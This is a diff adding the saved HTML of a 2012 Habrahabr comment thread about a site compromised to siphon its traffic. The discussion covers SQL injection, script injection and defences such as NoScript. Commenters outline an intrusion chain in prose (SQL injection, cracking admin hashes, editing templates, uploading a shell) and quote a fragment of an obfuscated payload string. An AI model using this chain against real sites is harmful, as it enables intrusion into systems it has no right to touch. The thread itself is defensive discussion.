+			<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4560997" class="link_to_comment">#</a>
+			
+			
+				<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4560990" data-id="4560997" data-parent_id="4560990" class="to_parent">↑</a>
+			
+			<span class="to_chidren"></span>
+			<div class="clear"></div>
+		</div>
+		<div class="message bad bad4">
+			Конечно, как в замечательном фильме }{0TT@6bl4 :) 
+		</div>
+		<div class="reply">
+			
+		</div>
+	
+	<div class="reply_comments" id="reply_comments_4560997">
+	
+	</div>
+</div>
+
+	
+	</div>
+</div>
+
+	 
+		
+<div class="comment_item" id="comment_4561041">
+	
+	
+		<div class="info  	" rel="4561041">
+			<div class="folding-dot-holder"><div class="folding-dot"></div></div>
+			
+			<div id="voting_4561041" class="voting   ">
+										
+				
+					<span class="plus" title="Голосовать могут только зарегистрированные пользователи."></span>
+					<span class="minus" title="Голосовать могут только зарегистрированные пользователи."></span>
+				
+				<div class="mark positive ">
+						<span class="score" title="Всего 3: &uarr;3 и &darr;0">+3</span> 
+				</div>	 
+			</div>
+			
+			<a href="http://habrahabr.ru/users/BeLove/" class="avatar"><img src="./Как я узнал, что у нас сливают трафик   Информационная безопасность   Хабрахабр_files/42671_24x24.jpg" alt=""></a>
+			<a href="http://habrahabr.ru/users/BeLove/" class="username">BeLove</a>
+			<time datetime="2012-01-25T23:18:58+04:00">25 января 2012, 23:18</time>
+			<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4561041" class="link_to_comment">#</a>
+			
+			
+				<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4560981" data-id="4561041" data-parent_id="4560981" class="to_parent">↑</a>
+			
+			<span class="to_chidren"></span>
+			<div class="clear"></div>
+		</div>
+		<div class="message ">
+			XSS внедренный в SQL inj это <i>SiXSS</i>, но тут явно речь не об этой атаке.<br>
+XSS тут как последствие (возможной) SQL инъекции, но не как активный результат SQL инъекции. 
+		</div>
+		<div class="reply">
+			
+		</div>
+	
+	<div class="reply_comments" id="reply_comments_4561041">
+	 
+		
+<div class="comment_item" id="comment_4562883">
+	
+	
+		<div class="info  	" rel="4562883">
+			<div class="folding-dot-holder"><div class="folding-dot"></div></div>
+			
+			<div id="voting_4562883" class="voting   ">
+										
+				
+					<span class="plus" title="Голосовать могут только зарегистрированные пользователи."></span>
+					<span class="minus" title="Голосовать могут только зарегистрированные пользователи."></span>
+				
+				<div class="mark  ">
+						<span class="score" title="Всего 0: &uarr;0 и &darr;0">0</span> 
+				</div>	 
+			</div>
+			
+			<a href="http://habrahabr.ru/users/Stdit/" class="avatar"><img src="./Как я узнал, что у нас сливают трафик   Информационная безопасность   Хабрахабр_files/stub-user-small.gif" alt=""></a>
+			<a href="http://habrahabr.ru/users/Stdit/" class="username">Stdit</a>
+			<time datetime="2012-01-26T18:20:29+04:00">26 января 2012, 18:20</time>
+			<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4562883" class="link_to_comment">#</a>
+			
+			
+				<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4561041" data-id="4562883" data-parent_id="4561041" class="to_parent">↑</a>
+			
+			<span class="to_chidren"></span>
+			<div class="clear"></div>
+		</div>
+		<div class="message ">
+			Вы правы, я сделал неправильный вывод из того, что сдвинулся div. Как оказалось, получили хеш админа. 
+		</div>
+		<div class="reply">
+			
+		</div>
+	
+	<div class="reply_comments" id="reply_comments_4562883">
+	
+	</div>
+</div>
+
+	
+	</div>
+</div>
+
+	
+	</div>
+</div>
+
+   
+    
+<div class="comment_item" id="comment_4561085">
+	
+	
+		<div class="info  	" rel="4561085">
+			<div class="folding-dot-holder"><div class="folding-dot"></div></div>
+			
+			<div id="voting_4561085" class="voting   ">
+										
+				
+					<span class="plus" title="Голосовать могут только зарегистрированные пользователи."></span>
+					<span class="minus" title="Голосовать могут только зарегистрированные пользователи."></span>
+				
+				<div class="mark positive ">
+						<span class="score" title="Всего 5: &uarr;5 и &darr;0">+5</span> 
+				</div>	 
+			</div>
+			
+			<a href="http://habrahabr.ru/users/Lefty/" class="avatar"><img src="./Как я узнал, что у нас сливают трафик   Информационная безопасность   Хабрахабр_files/46053_24x24.jpg" alt=""></a>
+			<a href="http://habrahabr.ru/users/Lefty/" class="username">Lefty</a>
+			<time datetime="2012-01-25T23:38:45+04:00">25 января 2012, 23:38</time>
+			<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4561085" class="link_to_comment">#</a>
+			
+			
+			<span class="to_chidren"></span>
+			<div class="clear"></div>
+		</div>
+		<div class="message ">
+			AlexanderPHP, вот, гляньте — <a href="http://forum.antichat.ru/thread305158.html">http://forum.antichat.ru/thread305158.html</a>. Отсюда ноги растут &gt;;) 
+		</div>
+		<div class="reply">
+			
+		</div>
+	
+	<div class="reply_comments" id="reply_comments_4561085">
+	 
+		
+<div class="comment_item" id="comment_4561145">
+	
+	
+		<div class="info  	" rel="4561145">
+			<div class="folding-dot-holder"><div class="folding-dot"></div></div>
+			
+			<div id="voting_4561145" class="voting   ">
+										
+				
+					<span class="plus" title="Голосовать могут только зарегистрированные пользователи."></span>
+					<span class="minus" title="Голосовать могут только зарегистрированные пользователи."></span>
+				
+				<div class="mark  ">
+						<span class="score" title="Всего 0: &uarr;0 и &darr;0">0</span> 
+				</div>	 
+			</div>
+			
+			<a href="http://habrahabr.ru/users/Kirhgoff/" class="avatar"><img src="./Как я узнал, что у нас сливают трафик   Информационная безопасность   Хабрахабр_files/stub-user-small.gif" alt=""></a>
+			<a href="http://habrahabr.ru/users/Kirhgoff/" class="username">Kirhgoff</a>
+			<time datetime="2012-01-26T00:11:59+04:00">26 января 2012, 00:11</time>
+			<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4561145" class="link_to_comment">#</a>
+			
+			
+				<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4561085" data-id="4561145" data-parent_id="4561085" class="to_parent">↑</a>
+			
+			<span class="to_chidren"></span>
+			<div class="clear"></div>
+		</div>
+		<div class="message ">
+			Прямо таки рассадник зла. Чувак себе купил доменов, продает иньекцию и кому то там надо для целей нехороших. Я вот не пойму на самом деле — они же не могут адресно атаковать конкретных людей. Выходит у них цель просто замутить себе свой ботнет?  
+		</div>
+		<div class="reply">
+			
+		</div>
+	
+	<div class="reply_comments" id="reply_comments_4561145">
+	
+	</div>
+</div>
+
+	 
+		
+<div class="comment_item" id="comment_4561484">
+	
+	
+		<div class="info  	" rel="4561484">
+			<div class="folding-dot-holder"><div class="folding-dot"></div></div>
+			
+			<div id="voting_4561484" class="voting   ">
+										
+				
+					<span class="plus" title="Голосовать могут только зарегистрированные пользователи."></span>
+					<span class="minus" title="Голосовать могут только зарегистрированные пользователи."></span>
+				
+				<div class="mark positive ">
+						<span class="score" title="Всего 3: &uarr;2 и &darr;1">+1</span> 
+				</div>	 
+			</div>
+			
+			<a href="http://habrahabr.ru/users/AstaRoth/" class="avatar"><img src="./Как я узнал, что у нас сливают трафик   Информационная безопасность   Хабрахабр_files/30517_24x24.jpg" alt=""></a>
+			<a href="http://habrahabr.ru/users/AstaRoth/" class="username">AstaRoth</a>
+			<time datetime="2012-01-26T09:36:09+04:00">26 января 2012, 09:36</time>
+			<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4561484" class="link_to_comment">#</a>
+			
+			
+				<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4561085" data-id="4561484" data-parent_id="4561085" class="to_parent">↑</a>
+			
+			<span class="to_chidren"></span>
+			<div class="clear"></div>
+		</div>
+		<div class="message ">
+			<img src="./Как я узнал, что у нас сливают трафик   Информационная безопасность   Хабрахабр_files/avatar108561.gif" alt="image"><br>
+отсюда 
+		</div>
+		<div class="reply">
+			
+		</div>
+	
+	<div class="reply_comments" id="reply_comments_4561484">
+	
+	</div>
+</div>
+
+	 
+		
+<div class="comment_item" id="comment_4563325">
+	
+	
+		<div class="info  	" rel="4563325">
+			<div class="folding-dot-holder"><div class="folding-dot"></div></div>
+			
+			<div id="voting_4563325" class="voting   ">
+										
+				
+					<span class="plus" title="Голосовать могут только зарегистрированные пользователи."></span>
+					<span class="minus" title="Голосовать могут только зарегистрированные пользователи."></span>
+				
+				<div class="mark  ">
+						<span class="score" title="Всего 0: &uarr;0 и &darr;0">0</span> 
+				</div>	 
+			</div>
+			
+			<a href="http://habrahabr.ru/users/Lux_In_Tenebris/" class="avatar"><img src="./Как я узнал, что у нас сливают трафик   Информационная безопасность   Хабрахабр_files/850_24x24.jpg" alt=""></a>
+			<a href="http://habrahabr.ru/users/Lux_In_Tenebris/" class="username">Lux_In_Tenebris</a>
+			<time datetime="2012-01-26T21:41:24+04:00">26 января 2012, 21:41</time>
+			<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4563325" class="link_to_comment">#</a>
+			
+			
+				<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4561085" data-id="4563325" data-parent_id="4561085" class="to_parent">↑</a>
+			
+			<span class="to_chidren"></span>
+			<div class="clear"></div>
+		</div>
+		<div class="message ">
+			выпилили тему<br>
+<a href="http://webcache.googleusercontent.com/search?q=cache:ZiZUxUqQ6IYJ:forum.antichat.ru/printthread.php%3Ft%3D306066">гуглокэш</a> пока ещё помнит что там было<br>
+сделал копию: <a href="http://www.peeep.us/e930014c">www.peeep.us/e930014c</a><br>
+ 
+		</div>
+		<div class="reply">
+			
+		</div>
+	
+	<div class="reply_comments" id="reply_comments_4563325">
+	
+	</div>
+</div>
+
+	
+	</div>
+</div>
+
+   
+    
+<div class="comment_item" id="comment_4561087">
+	
+	
+		<div class="info  	" rel="4561087">
+			<div class="folding-dot-holder"><div class="folding-dot"></div></div>
+			
+			<div id="voting_4561087" class="voting   ">
+										
+				
+					<span class="plus" title="Голосовать могут только зарегистрированные пользователи."></span>
+					<span class="minus" title="Голосовать могут только зарегистрированные пользователи."></span>
+				
+				<div class="mark  ">
+						<span class="score" title="Всего 0: &uarr;0 и &darr;0">0</span> 
+				</div>	 
+			</div>
+			
+			<a href="http://habrahabr.ru/users/zaartix/" class="avatar"><img src="./Как я узнал, что у нас сливают трафик   Информационная безопасность   Хабрахабр_files/37986_24x24.gif" alt=""></a>
+			<a href="http://habrahabr.ru/users/zaartix/" class="username">zaartix</a>
+			<time datetime="2012-01-25T23:39:33+04:00">25 января 2012, 23:39</time>
+			<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4561087" class="link_to_comment">#</a>
+			
+			
+			<span class="to_chidren"></span>
+			<div class="clear"></div>
+		</div>
+		<div class="message ">
+			Очень хотелось бы выяснить каким образом через sql-инъекцию могли поменять шаблон сайта? Или шаблоны в бд лежат? 
+		</div>
+		<div class="reply">
+			
+		</div>
+	
+	<div class="reply_comments" id="reply_comments_4561087">
+	 
+		
+<div class="comment_item" id="comment_4561098">
+	
+	
+		<div class="info  	" rel="4561098">
+			<div class="folding-dot-holder"><div class="folding-dot"></div></div>
+			
+			<div id="voting_4561098" class="voting   ">
+										
+				
+					<span class="plus" title="Голосовать могут только зарегистрированные пользователи."></span>
+					<span class="minus" title="Голосовать могут только зарегистрированные пользователи."></span>
+				
+				<div class="mark  negative">
+						<span class="score" title="Всего 1: &uarr;0 и &darr;1">–1</span> 
+				</div>	 
+			</div>
+			
+			<a href="http://habrahabr.ru/users/Stdit/" class="avatar"><img src="./Как я узнал, что у нас сливают трафик   Информационная безопасность   Хабрахабр_files/stub-user-small.gif" alt=""></a>
+			<a href="http://habrahabr.ru/users/Stdit/" class="username">Stdit</a>
+			<time datetime="2012-01-25T23:46:11+04:00">25 января 2012, 23:46</time>
+			<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4561098" class="link_to_comment">#</a>
+			
+			
+				<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4561087" data-id="4561098" data-parent_id="4561087" class="to_parent">↑</a>
+			
+			<span class="to_chidren"></span>
+			<div class="clear"></div>
+		</div>
+		<div class="message bad bad1">
+			Судя по тому, что взломщик не смог вставить скрипт, не покорёжив верстку, возможно, какие-то данные из базы выводятся в сыром виде, в атрибут какго-то тега. 
+		</div>
+		<div class="reply">
+			
+		</div>
+	
+	<div class="reply_comments" id="reply_comments_4561098">
+	
+	</div>
+</div>
+
+	 
+		
+<div class="comment_item" id="comment_4561174">
+	
+	
+		<div class="info  	" rel="4561174">
+			<div class="folding-dot-holder"><div class="folding-dot"></div></div>
+			
+			<div id="voting_4561174" class="voting   ">
+										
+				
+					<span class="plus" title="Голосовать могут только зарегистрированные пользователи."></span>
+					<span class="minus" title="Голосовать могут только зарегистрированные пользователи."></span>
+				
+				<div class="mark positive ">
+						<span class="score" title="Всего 3: &uarr;3 и &darr;0">+3</span> 
+				</div>	 
+			</div>
+			
+			<a href="http://habrahabr.ru/users/akirsanov/" class="avatar"><img src="./Как я узнал, что у нас сливают трафик   Информационная безопасность   Хабрахабр_files/28294_24x24.gif" alt=""></a>
+			<a href="http://habrahabr.ru/users/akirsanov/" class="username">akirsanov</a>
+			<time datetime="2012-01-26T00:33:18+04:00">26 января 2012, 00:33</time>
+			<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4561174" class="link_to_comment">#</a>
+			
+			
+				<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4561087" data-id="4561174" data-parent_id="4561087" class="to_parent">↑</a>
+			
+			<span class="to_chidren"></span>
+			<div class="clear"></div>
+		</div>
+		<div class="message ">
+			как вариант sql инъекция-&gt;список хешей администраторов-&gt;подбор паролей к хешам-&gt;admin доступ  
+		</div>
+		<div class="reply">
+			
+		</div>
+	
+	<div class="reply_comments" id="reply_comments_4561174">
+	 
+		
+<div class="comment_item" id="comment_4561375">
+	
+	
+		<div class="info  	" rel="4561375">
+			<div class="folding-dot-holder"><div class="folding-dot"></div></div>
+			
+			<div id="voting_4561375" class="voting   ">
+										
+				
+					<span class="plus" title="Голосовать могут только зарегистрированные пользователи."></span>
+					<span class="minus" title="Голосовать могут только зарегистрированные пользователи."></span>
+				
+				<div class="mark positive ">
+						<span class="score" title="Всего 1: &uarr;1 и &darr;0">+1</span> 
+				</div>	 
+			</div>
+			
+			<a href="http://habrahabr.ru/users/nllm/" class="avatar"><img src="./Как я узнал, что у нас сливают трафик   Информационная безопасность   Хабрахабр_files/stub-user-small.gif" alt=""></a>
+			<a href="http://habrahabr.ru/users/nllm/" class="username">nllm</a>
+			<time datetime="2012-01-26T05:57:03+04:00">26 января 2012, 05:57</time>
+			<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4561375" class="link_to_comment">#</a>
+			
+			
+				<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4561174" data-id="4561375" data-parent_id="4561174" class="to_parent">↑</a>
+			
+			<span class="to_chidren"></span>
+			<div class="clear"></div>
+		</div>
+		<div class="message ">
+			-&gt; Правка шаблона из админки (например, если это Joomla) и/или загрузка «шелла» через эксплойты на сервер для последующей правки всего что можно 
+		</div>
+		<div class="reply">
+			
+		</div>
+	
+	<div class="reply_comments" id="reply_comments_4561375">
+	
+	</div>
+</div>
+
+	
+	</div>
+</div>
+
+	
+	</div>
+</div>
+
+   
+    
+<div class="comment_item" id="comment_4561136">
+	
+	
+		<div class="info  	" rel="4561136">
+			<div class="folding-dot-holder"><div class="folding-dot"></div></div>
+			
+			<div id="voting_4561136" class="voting   ">
+										
+				
+					<span class="plus" title="Голосовать могут только зарегистрированные пользователи."></span>
+					<span class="minus" title="Голосовать могут только зарегистрированные пользователи."></span>
+				
+				<div class="mark  ">
+						<span class="score" title="Всего 0: &uarr;0 и &darr;0">0</span> 
+				</div>	 
+			</div>
+			
+			<a href="http://habrahabr.ru/users/antivir/" class="avatar"><img src="./Как я узнал, что у нас сливают трафик   Информационная безопасность   Хабрахабр_files/stub-user-small.gif" alt=""></a>
+			<a href="http://habrahabr.ru/users/antivir/" class="username">antivir</a>
+			<time datetime="2012-01-26T00:07:34+04:00">26 января 2012, 00:07</time>
+			<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4561136" class="link_to_comment">#</a>
+			
+			
+			<span class="to_chidren"></span>
+			<div class="clear"></div>
+		</div>
+		<div class="message ">
+			Скажите, подобную загрузку других сайтов можно как-то обнаружить плагинами к Firefox? Покажут ли это плагины, показывающие лог загрузки сайта? Какой плагин порекомендуете? 
+		</div>
+		<div class="reply">
+			
+		</div>
+	
+	<div class="reply_comments" id="reply_comments_4561136">
+	 
+		
+<div class="comment_item" id="comment_4561202">
+	
+	
+		<div class="info  	" rel="4561202">
+			<div class="folding-dot-holder"><div class="folding-dot"></div></div>
+			
+			<div id="voting_4561202" class="voting   ">
+										
+				
+					<span class="plus" title="Голосовать могут только зарегистрированные пользователи."></span>
+					<span class="minus" title="Голосовать могут только зарегистрированные пользователи."></span>
+				
+				<div class="mark positive ">
+						<span class="score" title="Всего 1: &uarr;1 и &darr;0">+1</span> 
+				</div>	 
+			</div>
+			
+			<a href="http://habrahabr.ru/users/chainik/" class="avatar"><img src="./Как я узнал, что у нас сливают трафик   Информационная безопасность   Хабрахабр_files/38904_24x24.jpg" alt=""></a>
+			<a href="http://habrahabr.ru/users/chainik/" class="username">chainik</a>
+			<time datetime="2012-01-26T00:50:36+04:00">26 января 2012, 00:50</time>
+			<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4561202" class="link_to_comment">#</a>
+			
+			
+				<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4561136" data-id="4561202" data-parent_id="4561136" class="to_parent">↑</a>
+			
+			<span class="to_chidren"></span>
+			<div class="clear"></div>
+		</div>
+		<div class="message ">
+			Лог загрузки сайта может показать Firebug (вкладка сеть), сейчас что-то похожее есть во всех браузерах по клавише F12. <br>
+Но вот чтобы само ловило попытки инъекций — я такого не знаю.  
+		</div>
+		<div class="reply">
+			
+		</div>
+	
+	<div class="reply_comments" id="reply_comments_4561202">
+	
+	</div>
+</div>
+
+	 
+		
+<div class="comment_item" id="comment_4561569">
+	
+	
+		<div class="info  	" rel="4561569">
+			<div class="folding-dot-holder"><div class="folding-dot"></div></div>
+			
+			<div id="voting_4561569" class="voting   ">
+										
+				
+					<span class="plus" title="Голосовать могут только зарегистрированные пользователи."></span>
+					<span class="minus" title="Голосовать могут только зарегистрированные пользователи."></span>
+				
+				<div class="mark positive ">
+						<span class="score" title="Всего 2: &uarr;2 и &darr;0">+2</span> 
+				</div>	 
+			</div>
+			
+			<a href="http://habrahabr.ru/users/kSx/" class="avatar"><img src="./Как я узнал, что у нас сливают трафик   Информационная безопасность   Хабрахабр_files/stub-user-small.gif" alt=""></a>
+			<a href="http://habrahabr.ru/users/kSx/" class="username">kSx</a>
+			<time datetime="2012-01-26T10:39:04+04:00">26 января 2012, 10:39</time>
+			<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4561569" class="link_to_comment">#</a>
+			
+			
+				<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4561136" data-id="4561569" data-parent_id="4561136" class="to_parent">↑</a>
+			
+			<span class="to_chidren"></span>
+			<div class="clear"></div>
+		</div>
+		<div class="message ">
+			NoScript для Firefox блокирует скрипты с неразрешенных доменов. 
+		</div>
+		<div class="reply">
+			
+		</div>
+	
+	<div class="reply_comments" id="reply_comments_4561569">
+	
+	</div>
+</div>
+
+	 
+		
+<div class="comment_item" id="comment_4561617">
+	
+	
+		<div class="info  	" rel="4561617">
+			<div class="folding-dot-holder"><div class="folding-dot"></div></div>
+			
+			<div id="voting_4561617" class="voting   ">
+										
+				
+					<span class="plus" title="Голосовать могут только зарегистрированные пользователи."></span>
+					<span class="minus" title="Голосовать могут только зарегистрированные пользователи."></span>
+				
+				<div class="mark positive ">
+						<span class="score" title="Всего 2: &uarr;2 и &darr;0">+2</span> 
+				</div>	 
+			</div>
+			
+			<a href="http://habrahabr.ru/users/argos/" class="avatar"><img src="./Как я узнал, что у нас сливают трафик   Информационная безопасность   Хабрахабр_files/27629_24x24.jpg" alt=""></a>
+			<a href="http://habrahabr.ru/users/argos/" class="username">argos</a>
+			<time datetime="2012-01-26T11:08:59+04:00">26 января 2012, 11:08</time>
+			<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4561617" class="link_to_comment">#</a>
+			
+			
+				<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4561136" data-id="4561617" data-parent_id="4561136" class="to_parent">↑</a>
+			
+			<span class="to_chidren"></span>
+			<div class="clear"></div>
+		</div>
+		<div class="message ">
+			Обнаружить — врядли, а вот обезопасить может — NoScript. Только если разрешаешь скрипт — следи чтобы не разрешить случайно goog1e вместо google (хотя у меня так вообще google-analytics по умолчанию везде забанен за ненадобностью) 
+		</div>
+		<div class="reply">
+			
+		</div>
+	
+	<div class="reply_comments" id="reply_comments_4561617">
+	
+	</div>
+</div>
+
+	
+	</div>
+</div>
+
+   
+    
+<div class="comment_item" id="comment_4561192">
+	
+	
+		<div class="info  	" rel="4561192">
+			<div class="folding-dot-holder"><div class="folding-dot"></div></div>
+			
+			<div id="voting_4561192" class="voting   ">
+										
+				
+					<span class="plus" title="Голосовать могут только зарегистрированные пользователи."></span>
+					<span class="minus" title="Голосовать могут только зарегистрированные пользователи."></span>
+				
+				<div class="mark positive ">
+						<span class="score" title="Всего 24: &uarr;24 и &darr;0">+24</span> 
+				</div>	 
+			</div>
+			
+			<a href="http://habrahabr.ru/users/vspopov/" class="avatar"><img src="./Как я узнал, что у нас сливают трафик   Информационная безопасность   Хабрахабр_files/58349_24x24.jpg" alt=""></a>
+			<a href="http://habrahabr.ru/users/vspopov/" class="username">vspopov</a>
+			<time datetime="2012-01-26T00:43:27+04:00">26 января 2012, 00:43</time>
+			<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4561192" class="link_to_comment">#</a>
+			
+			
+			<span class="to_chidren"></span>
+			<div class="clear"></div>
+		</div>
+		<div class="message ">
+			хорошие зрение сто рублей премия 
+		</div>
+		<div class="reply">
+			
+		</div>
+	
+	<div class="reply_comments" id="reply_comments_4561192">
+	 
+		
+<div class="comment_item" id="comment_4561269">
+	
+	
+		<div class="info  	" rel="4561269">
+			<div class="folding-dot-holder"><div class="folding-dot"></div></div>
+			
+			<div id="voting_4561269" class="voting   ">
+										
+				
+					<span class="plus" title="Голосовать могут только зарегистрированные пользователи."></span>
+					<span class="minus" title="Голосовать могут только зарегистрированные пользователи."></span>
+				
+				<div class="mark positive ">
+						<span class="score" title="Всего 3: &uarr;3 и &darr;0">+3</span> 
+				</div>	 
+			</div>
+			
+			<a href="http://habrahabr.ru/users/5ap/" class="avatar"><img src="./Как я узнал, что у нас сливают трафик   Информационная безопасность   Хабрахабр_files/12075_24x24.jpg" alt=""></a>
+			<a href="http://habrahabr.ru/users/5ap/" class="username">5ap</a>
+			<time datetime="2012-01-26T02:06:51+04:00">26 января 2012, 02:06</time>
+			<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4561269" class="link_to_comment">#</a>
+			
+			
+				<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4561192" data-id="4561269" data-parent_id="4561192" class="to_parent">↑</a>
+			
+			<span class="to_chidren"></span>
+			<div class="clear"></div>
+		</div>
+		<div class="message ">
+			хорошее зрение вот грамота спасибо =) 
+		</div>
+		<div class="reply">
+			
+		</div>
+	
+	<div class="reply_comments" id="reply_comments_4561269">
+	
+	</div>
+</div>
+
+	
+	</div>
+</div>
+
+   
+    
+<div class="comment_item" id="comment_4561405">
+	
+	
+		<div class="info  	" rel="4561405">
+			<div class="folding-dot-holder"><div class="folding-dot"></div></div>
+			
+			<div id="voting_4561405" class="voting   ">
+										
+				
+					<span class="plus" title="Голосовать могут только зарегистрированные пользователи."></span>
+					<span class="minus" title="Голосовать могут только зарегистрированные пользователи."></span>
+				
+				<div class="mark positive ">
+						<span class="score" title="Всего 4: &uarr;4 и &darr;0">+4</span> 
+				</div>	 
+			</div>
+			
+			<a href="http://habrahabr.ru/users/AstonMartin/" class="avatar"><img src="./Как я узнал, что у нас сливают трафик   Информационная безопасность   Хабрахабр_files/stub-user-small.gif" alt=""></a>
+			<a href="http://habrahabr.ru/users/AstonMartin/" class="username">AstonMartin</a>
+			<time datetime="2012-01-26T07:31:21+04:00">26 января 2012, 07:31</time>
+			<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4561405" class="link_to_comment">#</a>
+			
+			
+			<span class="to_chidren"></span>
+			<div class="clear"></div>
+		</div>
+		<div class="message ">
+			Интересно, обнаруживает ли Яндекс подобные вещи на сайтах с целью предупреждения вебмастеров? 
+		</div>
+		<div class="reply">
+			
+		</div>
+	
+	<div class="reply_comments" id="reply_comments_4561405">
+	 
+		
+<div class="comment_item" id="comment_4563329">
+	
+	
+		<div class="info  	" rel="4563329">
+			<div class="folding-dot-holder"><div class="folding-dot"></div></div>
+			
+			<div id="voting_4563329" class="voting   ">
+										
+				
+					<span class="plus" title="Голосовать могут только зарегистрированные пользователи."></span>
+					<span class="minus" title="Голосовать могут только зарегистрированные пользователи."></span>
+				
+				<div class="mark  ">
+						<span class="score" title="Всего 0: &uarr;0 и &darr;0">0</span> 
+				</div>	 
+			</div>
+			
+			<a href="http://habrahabr.ru/users/Lux_In_Tenebris/" class="avatar"><img src="./Как я узнал, что у нас сливают трафик   Информационная безопасность   Хабрахабр_files/850_24x24.jpg" alt=""></a>
+			<a href="http://habrahabr.ru/users/Lux_In_Tenebris/" class="username">Lux_In_Tenebris</a>
+			<time datetime="2012-01-26T21:43:43+04:00">26 января 2012, 21:43</time>
+			<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4563329" class="link_to_comment">#</a>
+			
+			
+				<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4561405" data-id="4563329" data-parent_id="4561405" class="to_parent">↑</a>
+			
+			<span class="to_chidren"></span>
+			<div class="clear"></div>
+		</div>
+		<div class="message ">
+			<blockquote><strong>Как Яндекс узнал о заражении?</strong><br>
+Яндекс проверяет страницы сайтов из поискового индекса. Для определения, присутствует ли на странице вредоносный код, используется технология нашего партнера компании Sophos® и собственный антивирусный комплекс.<br>
+наверх<br>
+<br>
+<strong>Как часто происходят проверки?</strong><br>
+Периодичность проверок может отличаться для разных сайтов. Невозможно гарантировать, что какой-то определенный сайт был или будет проверен в строго определенное время. Поэтому данные о появлении вредоносного кода на сайтах или его устранении могут обновляться с задержкой.<br>
+Если было выявлено, что сайт заражен, он обязательно будет в дальнейшем перепроверяться. С каждой новой проверкой интервалы между ними будут становиться больше. Поэтому чем раньше будет найден и устранен вредоносный код, тем оперативнее Яндекс об этом узнает и снимет пометку о потенциальной опасности сайта.</blockquote><br>
+<br>
+<a href="http://help.yandex.ru/webmaster/?id=1059440">help.yandex.ru/webmaster/?id=1059440</a> 
+		</div>
+		<div class="reply">
+			
+		</div>
+	
+	<div class="reply_comments" id="reply_comments_4563329">
+	
+	</div>
+</div>
+
+	
+	</div>
+</div>
+
+   
+    
+<div class="comment_item" id="comment_4561439">
+	
+	
+		<div class="info  	" rel="4561439">
+			<div class="folding-dot-holder"><div class="folding-dot"></div></div>
+			
+			<div id="voting_4561439" class="voting   ">
+										
+				
+					<span class="plus" title="Голосовать могут только зарегистрированные пользователи."></span>
+					<span class="minus" title="Голосовать могут только зарегистрированные пользователи."></span>
+				
+				<div class="mark positive ">
+						<span class="score" title="Всего 2: &uarr;2 и &darr;0">+2</span> 
+				</div>	 
+			</div>
+			
+			<a href="http://habrahabr.ru/users/Zyamilon/" class="avatar"><img src="./Как я узнал, что у нас сливают трафик   Информационная безопасность   Хабрахабр_files/27276_24x24.png" alt=""></a>
+			<a href="http://habrahabr.ru/users/Zyamilon/" class="username">Zyamilon</a>
+			<time datetime="2012-01-26T08:31:50+04:00">26 января 2012, 08:31</time>
+			<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4561439" class="link_to_comment">#</a>
+			
+			
+			<span class="to_chidren"></span>
+			<div class="clear"></div>
+		</div>
+		<div class="message ">
+			&gt;&gt; $P = '$??^$((.=-$^&gt;_=;$=&gt;.&gt;.&gt;?&gt;[=;$=&gt;.&gt;.&gt;?[??&gt;$=?_?=?#$[(#?&gt;$(?=?^$[=;$=&gt;.&gt;.&gt;<br>
+Это ведь не руками пишется? Как вообще столь мелкий скрипт раздувается? о_0 Обфускатор какой-то используется или что-то подобное, да?<br>
+<br>
+&gt;&gt; Раскодируем поэтапно скрипт воспользовавшись обратными функциями:.<br>
+Не могли бы вы подробнее рассказать об этом? 
+		</div>
+		<div class="reply">
+			
+		</div>
+	
+	<div class="reply_comments" id="reply_comments_4561439">
+	 
+		
+<div class="comment_item" id="comment_4561521">
+	
+	
+		<div class="info  	" rel="4561521">
+			<div class="folding-dot-holder"><div class="folding-dot"></div></div>
+			
+			<div id="voting_4561521" class="voting   ">
+										
+				
+					<span class="plus" title="Голосовать могут только зарегистрированные пользователи."></span>
+					<span class="minus" title="Голосовать могут только зарегистрированные пользователи."></span>
+				
+				<div class="mark  ">
+						<span class="score" title="Всего 0: &uarr;0 и &darr;0">0</span> 
+				</div>	 
+			</div>
+			
+			<a href="http://habrahabr.ru/users/shanker/" class="avatar"><img src="./Как я узнал, что у нас сливают трафик   Информационная безопасность   Хабрахабр_files/47073_24x24.png" alt=""></a>
+			<a href="http://habrahabr.ru/users/shanker/" class="username">shanker</a>
+			<time datetime="2012-01-26T10:02:48+04:00">26 января 2012, 10:02</time>
+			<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4561521" class="link_to_comment">#</a>
+			
+			
+				<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4561439" data-id="4561521" data-parent_id="4561439" class="to_parent">↑</a>
+			
+			<span class="to_chidren"></span>
+			<div class="clear"></div>
+		</div>
